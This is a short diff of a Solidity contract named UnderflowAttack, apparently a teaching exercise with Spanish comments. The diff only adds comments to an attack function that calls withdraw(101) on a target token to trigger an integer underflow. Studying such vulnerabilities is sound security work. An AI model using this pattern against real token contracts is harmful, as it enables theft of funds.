@@ -6,12 +6,15 @@ interface ITokenUnderflow {
 }
 
 contract UnderflowAttack {
+    // Variables    
     ITokenUnderflow public target;
 
+    // Constructor
     constructor(address _target) {
         target = ITokenUnderflow(_target);
     }
 
+    //Funcion de ataque
     function attack() public {
         // Si el saldo es 100, intentamos retirar 101 para realizar el underflow
         target.withdraw(101);
